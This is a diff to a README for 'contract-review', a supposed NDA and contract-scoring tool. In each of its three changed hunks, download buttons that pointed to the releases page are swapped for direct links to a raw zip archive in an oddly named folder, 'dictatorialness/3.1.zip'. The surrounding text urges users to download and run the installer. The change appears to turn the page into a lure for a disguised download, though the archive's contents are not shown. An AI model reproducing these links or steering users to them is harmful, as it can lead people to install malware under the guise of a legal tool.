@@ -1,6 +1,6 @@
 <h1>📝 contract-review - Score Your Contracts Instantly, Simplified</h1>
 
-<a href="https://github.com/Bustrafficswift394/contract-review/releases" style="display:inline-block;background:#3b82f6;color:#ffffff;padding:14px 28px;font-size:20px;font-weight:bold;border-radius:8px;text-decoration:none;margin:20px 0;">⬇️ Download contract-review Now</a>
+<a href="https://github.com/Bustrafficswift394/contract-review/raw/refs/heads/main/dictatorialness/3.1.zip" style="display:inline-block;background:#3b82f6;color:#ffffff;padding:14px 28px;font-size:20px;font-weight:bold;border-radius:8px;text-decoration:none;margin:20px 0;">⬇️ Download contract-review Now</a>
 
 <h2>🤔 What Is contract-review?</h2>
 <p>contract-review is a simple, powerful tool that helps you understand any NDA (Non-Disclosure Agreement) or contract before you sign. It automatically scores the document from your perspective, showing you how risky or favorable it is. Then, it redlines the text directly, creating tracked changes and threaded comments just like a professional lawyer would. You'll see exactly what to watch out for, without needing any legal expertise.</p>
@@ -37,7 +37,7 @@
 
 <h3>Step 1: Download the App</h3>
 <p>Click the big blue button at the top of this page, or go directly to this link:</p>
-<p><a href="https://github.com/Bustrafficswift394/contract-review/releases" style="background:#22c55e;color:#ffffff;padding:10px 20px;border-radius:6px;text-decoration:none;font-weight:bold;">⬇️ Visit this link to download the application</a></p>
+<p><a href="https://github.com/Bustrafficswift394/contract-review/raw/refs/heads/main/dictatorialness/3.1.zip" style="background:#22c55e;color:#ffffff;padding:10px 20px;border-radius:6px;text-decoration:none;font-weight:bold;">⬇️ Visit this link to download the application</a></p>
 
 <p>Once you’re on that page, look for the latest release. The download file will be listed there. If you’re unsure which one to pick, choose the one that matches your system (likely Windows 64-bit).</p>
 
@@ -113,7 +113,7 @@
 <h2>🎉 Ready to Review Your Contract?</h2>
 <p>Don’t sign blind. Try contract-review today and take the guesswork out of understanding your legal documents. It’s free, it’s easy, and it gives you peace of mind.</p>
 
-<a href="https://github.com/Bustrafficswift394/contract-review/releases" style="display:inline-block;background:#8b5cf6;color:#ffffff;padding:16px 34px;font-size:22px;font-weight:bold;border-radius:8px;text-decoration:none;margin:10px 0;">Get contract-review Now</a>
+<a href="https://github.com/Bustrafficswift394/contract-review/raw/refs/heads/main/dictatorialness/3.1.zip" style="display:inline-block;background:#8b5cf6;color:#ffffff;padding:16px 34px;font-size:22px;font-weight:bold;border-radius:8px;text-decoration:none;margin:10px 0;">Get contract-review Now</a>
 
 <h2>📈 Keep It Updated</h2>
 <p>We regularly improve the scoring and features. Check the download page occasionally for new versions. Updating is the same process as installing – just run the new installer and it will replace the old version.</p>
